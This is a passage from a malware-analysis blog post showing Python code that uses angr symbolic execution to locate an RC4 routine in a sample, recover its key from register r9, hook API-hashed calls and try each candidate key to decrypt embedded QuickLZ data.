</span></span></code></pre></div><p>Then we just need to fix the offsets - which are relative to the start of <code>.text</code>, so they match the virtual address:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="n">offsets</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">offset</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">yara_matches</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">strings</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># offset are relative to .text, rebase them</span>
</span></span><span class="line"><span class="cl">            <span class="n">off</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">pe</span><span class="o">.</span><span class="n">OPTIONAL_HEADER</span><span class="o">.</span><span class="n">ImageBase</span> <span class="o">+</span> <span class="n">section</span><span class="o">.</span><span class="n">VirtualAddress</span> <span class="o">+</span> <span class="n">offset</span>
</span></span><span class="line"><span class="cl">            <span class="n">offsets</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">off</span><span class="p">)</span>
</span></span></code></pre></div><p>Using these offsets, we can find the start of the function they live in:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">offset</span> <span class="ow">in</span> <span class="n">offsets</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># find function containg the offset</span>
</span></span><span class="line"><span class="cl">            <span class="n">func</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">find_func_addr</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">func</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;skip 0x</span><span class="si">%x</span><span class="s2">: not part of a func...&#34;</span><span class="o">%</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">func</span><span class="o">.</span><span class="n">predecessors</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;skip 0x</span><span class="si">%x</span><span class="s2">: no predecessor...&#34;</span><span class="o">%</span><span class="n">offset</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">func</span><span class="o">.</span><span class="n">predecessors</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;skip 0x</span><span class="si">%s</span><span class="s2">: too many predecessors (</span><span class="si">%d</span><span class="s2">)&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">func</span><span class="o">.</span><span class="n">addr</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">func</span><span class="o">.</span><span class="n">predecessors</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;found potential rc4 code: 0x</span><span class="si">%x</span><span class="s2">&#34;</span><span class="o">%</span><span class="n">func</span><span class="o">.</span><span class="n">addr</span><span class="p">)</span>
</span></span></code></pre></div><p>We discard an offset if:</p>
<ul>
<li>it does not belong to a function</li>
<li>it belongs to a function with no predecessors (meaning it&rsquo;s not called)</li>
<li>it belongs to a function with more than 2 predecessors (called from more than 2 different places)
<ul>
<li><em>the RC4 function should only be called from one place - 2 is being conservative</em></li>
</ul>
</li>
</ul>
<p>Now that we have the start address of a <em>potential</em> RC4 function, we need to:</p>
<ul>
<li>find the XREF (the <code>CALL rc4</code>)</li>
<li>find the calling function start address</li>
</ul>
<p>Which is just repeating what we just did:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">            <span class="c1"># list of (start_addr, stop_addr) to emulate</span>
</span></span><span class="line"><span class="cl">            <span class="n">explorer</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">pred</span> <span class="ow">in</span> <span class="n">func</span><span class="o">.</span><span class="n">predecessors</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">caller</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">find_func_addr</span><span class="p">(</span><span class="n">pred</span><span class="o">.</span><span class="n">addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="c1"># skip some cases where start_addr == stop_addr</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">caller</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span> <span class="ow">and</span> <span class="n">caller</span><span class="o">.</span><span class="n">addr</span> <span class="o">!=</span> <span class="n">pred</span><span class="o">.</span><span class="n">addr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">explorer</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">caller</span><span class="o">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">pred</span><span class="o">.</span><span class="n">addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34; * found caller (0x</span><span class="si">%x</span><span class="s2"> -&gt; 0x</span><span class="si">%x</span><span class="s2">)&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">caller</span><span class="o">.</span><span class="n">addr</span><span class="p">,</span> <span class="n">pred</span><span class="o">.</span><span class="n">addr</span><span class="p">))</span>
</span></span></code></pre></div><p>At this stage, we should have a list in the form of:</p>
<pre tabindex="0"><code>explorer = [
    (addr_start_func1, addr_call_rc4_in_func1),
    (addr_start_func2, addr_call_rc4_in_func2),
    ...
]
</code></pre><p>We can just emulate from the <code>function start address</code> to the <code>call rc4 function address</code> and dump the key from register <code>r9</code> (according to the <a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 fastcall convention</a>, r9 holds the 4th parameter - the pointer to the key in our case).</p>
<h3 id="222-emulation">2.2.2. Emulation</h3>
<p>The emulation goes as follow:</p>
<ul>
<li>create an initial state simulating a function call at our start address
<ul>
<li><em>we use the <code>CALLLESS</code> option to skip over function calls as they are not related to the key computation</em></li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">state</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">call_state</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="n">start_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">state</span><span class="o">.</span><span class="n">options</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">angr</span><span class="o">.</span><span class="n">options</span><span class="o">.</span><span class="n">CALLLESS</span><span class="p">)</span>
</span></span></code></pre></div><ul>
<li>create a <code>Simulation Manager</code> and then <code>step</code> until one of the state reachs our destination address</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">simgr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">simgr</span><span class="o">.</span><span class="n">step</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">state</span> <span class="ow">in</span> <span class="n">simgr</span><span class="o">.</span><span class="n">active</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">check_state</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">key</span>
</span></span></code></pre></div><p>with a few extra conditions to avoid looping when there&rsquo;s no active path left or when the path gets too complex (arbitrary pick), it looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">emulate</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">start_addr</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">max_iter</span><span class="o">=</span><span class="mi">3000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; symbolic execution from start_addr to stop_addr.
</span></span></span><span class="line"><span class="cl"><span class="s2">        max_iter is the maximum number of instructions
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">        return None if failed, or [r9]
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;emulating from 0x</span><span class="si">%x</span><span class="s2"> to 0x</span><span class="si">%x</span><span class="s2"> (max iter = </span><span class="si">%s</span><span class="s2">)&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">start_addr</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">,</span> <span class="n">max_iter</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">call_state</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="n">start_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># no function call</span>
</span></span><span class="line"><span class="cl">        <span class="n">state</span><span class="o">.</span><span class="n">options</span><span class="o">.</span><span class="n">add</span><span class="p">(</span><span class="n">angr</span><span class="o">.</span><span class="n">options</span><span class="o">.</span><span class="n">CALLLESS</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">simgr</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">simulation_manager</span><span class="p">(</span><span class="n">state</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># advance all states by one basic block</span>
</span></span><span class="line"><span class="cl">            <span class="n">simgr</span><span class="o">.</span><span class="n">step</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">max_iter</span> <span class="o">-=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># very arbitrary picks</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># we shouldnt run into too complex paths</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">max_iter</span> <span class="ow">or</span> <span class="nb">len</span><span class="p">(</span><span class="n">simgr</span><span class="o">.</span><span class="n">active</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">10</span> <span class="ow">or</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">simgr</span><span class="o">.</span><span class="n">active</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="c1"># check each active</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">state</span> <span class="ow">in</span> <span class="n">simgr</span><span class="o">.</span><span class="n">active</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">check_state</span><span class="p">(</span><span class="n">state</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">key</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="n">key</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span></code></pre></div><p>The <code>check_state</code> function will check if the current state address is the destination address, and if so, will dereference the value of the R9 register (4th parameter)
and read a DWORD in there.</p>
<p>I assume the key is always 4 bytes long, however should it not be the case, its length can be read from the stack (5th function parameter).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">check_state</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; check if a state reached the expected address
</span></span></span><span class="line"><span class="cl"><span class="s2">            hook potential calls with unconstrained destinations
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">            returns the key if arrived at destination
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># final destination</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#if state.addr in range(stop_addr, stop_addr+8):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">state</span><span class="o">.</span><span class="n">addr</span> <span class="o">==</span> <span class="n">stop_addr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># dereference r9 register and read a DWORD</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># we assume the key is 4 bytes, we could read its size off the stack</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">state</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">state</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">state</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">r9</span><span class="p">]</span><span class="o">.</span><span class="n">uint32_t</span><span class="o">.</span><span class="n">resolved</span><span class="p">))</span>
</span></span></code></pre></div><p>There&rsquo;s an extra twist in the <code>check_state</code> function.</p>
<p>The sample uses API hashing to resolve api proc addresses, and we explicitly told angr to skip function calls (<em>CALLLESS</em>).
The effect of the CALLLESS flag is that the return value of all function calls will be unconstrained (symbolic).</p>
<p>So what should have been:</p>
<pre tabindex="0"><code>address = get_proc_address(0x12345678) // returns 0x18032323
(*0x18032323)(arg1, arg2)
</code></pre><p>becomes:</p>
<pre tabindex="0"><code>address = get_proc_address(0x12345678) // returns some symbolic constant
(*????????)(arg1, arg2)
</code></pre><p>and basically angr stops because there&rsquo;s too many possible paths (for some reason, even with the <code>CALLLESS</code>flag).</p>
<p><img src="api_1.png" alt="api1"></p>
<p>call to resolved function (call to a stack address):
<img src="api_2.png" alt="api2"></p>
<p>My work around to that was to hook all <code>CALL</code>instructions to a temp address by:</p>
<ul>
<li>checking if the node successor is reached via a call:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">block</span><span class="o">.</span><span class="n">vex</span><span class="o">.</span><span class="n">jumpkind</span> <span class="o">==</span> <span class="s1">&#39;Ijk_Call&#39;</span><span class="p">:</span>
</span></span></code></pre></div><ul>
<li>then checking if the call uses a temp value:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="n">block</span><span class="o">.</span><span class="n">vex</span><span class="o">.</span><span class="n">next</span><span class="o">.</span><span class="n">tag</span> <span class="o">==</span> <span class="s1">&#39;Iex_RdTmp&#39;</span><span class="p">:</span>
</span></span></code></pre></div><ul>
<li>looping over the block instructions to find the actual call and hook it with something of ours:</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">insn</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">block</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">addr</span><span class="p">)</span><span class="o">.</span><span class="n">capstone</span><span class="o">.</span><span class="n">insns</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">insn</span><span class="o">.</span><span class="n">mnemonic</span> <span class="o">==</span> <span class="s1">&#39;call&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">insn</span><span class="o">.</span><span class="n">address</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">hooks</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;hooking addr=0x</span><span class="si">%x</span><span class="s2"> size=</span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">insn</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">insn</span><span class="o">.</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                            <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">hook</span><span class="p">(</span><span class="n">insn</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">hook_api_hash</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="n">insn</span><span class="o">.</span><span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="c1"># in order to avoid hook twice // angr would warn anyway</span>
</span></span><span class="line"><span class="cl">                            <span class="bp">self</span><span class="o">.</span><span class="n">hooks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">insn</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span></code></pre></div><p>The hook is very simple and looks like that:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">hook_api_hash</span><span class="p">(</span><span class="n">state</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34; hook register calls with this
</span></span></span><span class="line"><span class="cl"><span class="s2">    &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># symbolize return value</span>
</span></span><span class="line"><span class="cl">    <span class="n">state</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">claripy</span><span class="o">.</span><span class="n">BVS</span><span class="p">(</span><span class="s1">&#39;ret&#39;</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
</span></span></code></pre></div><p>The full <code>check_state</code> function looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">check_state</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">state</span><span class="p">,</span> <span class="n">stop_addr</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;&#34;&#34; check if a state reached the expected address)
</span></span></span><span class="line"><span class="cl"><span class="s2">            hook potential call with unconstrained destinatinations
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">            returns the key if arrived at destination
</span></span></span><span class="line"><span class="cl"><span class="s2">        &#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># final destination</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#if state.addr in range(stop_addr, stop_addr+8):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">state</span><span class="o">.</span><span class="n">addr</span> <span class="o">==</span> <span class="n">stop_addr</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># dereference r9 register and read a DWORD</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># we assume the key is 4 bytes, we could read its size off the stack</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="n">state</span><span class="o">.</span><span class="n">solver</span><span class="o">.</span><span class="n">eval</span><span class="p">(</span><span class="n">state</span><span class="o">.</span><span class="n">mem</span><span class="p">[</span><span class="n">state</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">r9</span><span class="p">]</span><span class="o">.</span><span class="n">uint32_t</span><span class="o">.</span><span class="n">resolved</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># hook registers calls (api hashing)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># we want to hook all &#34;call $tmp&#34;, otherwise angr gets lost</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># even with angr.options.CALLLESS</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">block</span> <span class="o">=</span> <span class="n">state</span><span class="o">.</span><span class="n">block</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">angr</span><span class="o">.</span><span class="n">errors</span><span class="o">.</span><span class="n">SimEngineError</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># verify that the block ends with a call</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">block</span><span class="o">.</span><span class="n">vex</span><span class="o">.</span><span class="n">jumpkind</span> <span class="o">==</span> <span class="s1">&#39;Ijk_Call&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># the next block is based on tmp value</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">block</span><span class="o">.</span><span class="n">vex</span><span class="o">.</span><span class="n">next</span><span class="o">.</span><span class="n">tag</span> <span class="o">==</span> <span class="s1">&#39;Iex_RdTmp&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="c1"># iterates over block instructions to find the call addr and size</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">insn</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">factory</span><span class="o">.</span><span class="n">block</span><span class="p">(</span><span class="n">block</span><span class="o">.</span><span class="n">addr</span><span class="p">)</span><span class="o">.</span><span class="n">capstone</span><span class="o">.</span><span class="n">insns</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">insn</span><span class="o">.</span><span class="n">mnemonic</span> <span class="o">==</span> <span class="s1">&#39;call&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">insn</span><span class="o">.</span><span class="n">address</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">hooks</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;hooking addr=0x</span><span class="si">%x</span><span class="s2"> size=</span><span class="si">%s</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">insn</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">insn</span><span class="o">.</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">                            <span class="bp">self</span><span class="o">.</span><span class="n">prj</span><span class="o">.</span><span class="n">hook</span><span class="p">(</span><span class="n">insn</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">hook_api_hash</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="n">insn</span><span class="o">.</span><span class="n">size</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="c1"># in order to avoid hook twice // angr would warn anyway</span>
</span></span><span class="line"><span class="cl">                            <span class="bp">self</span><span class="o">.</span><span class="n">hooks</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">insn</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
</span></span></code></pre></div><p>in the end we, we can just loop over the <code>(start_addr, stop_addr)</code> tupples, to get a list of potential RC4 keys:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">        <span class="c1"># emulate all potential calls</span>
</span></span><span class="line"><span class="cl">        <span class="n">potential_keys</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">start</span><span class="p">,</span> <span class="n">stop</span> <span class="ow">in</span> <span class="n">explorer</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># emulate</span>
</span></span><span class="line"><span class="cl">            <span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">emulate</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">stop</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">potential_keys</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">potential_keys</span>
</span></span></code></pre></div><h2 id="23-decrypting">2.3. Decrypting</h2>
<p>now that we constructed a list of potential keys, we can just try them all.
using the QuickLZ header, we can know that we found a correct one by matching the size of the data with what&rsquo;s in the header:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">try_to_decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">potential_keys</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39; try all keys with xor and without
</span></span></span><span class="line"><span class="cl"><span class="s1">        it seems the xor is not always applied
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">potential_keys</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">apply_xor</span> <span class="ow">in</span> <span class="p">[</span><span class="kc">True</span><span class="p">,</span> <span class="kc">False</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;trying key </span><span class="si">%r</span><span class="s2"> / xor=</span><span class="si">%r</span><span class="s2">&#34;</span><span class="o">%</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">apply_xor</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="n">dec</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">apply_xor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dec</span> <span class="ow">is</span> <span class="ow">not</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">dec</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">None</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">apply_xor</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;&#39;&#39; decrypt + decompress data
</span></span></span><span class="line"><span class="cl"><span class="s1">    &#39;&#39;&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># RC4 decrypt</span>
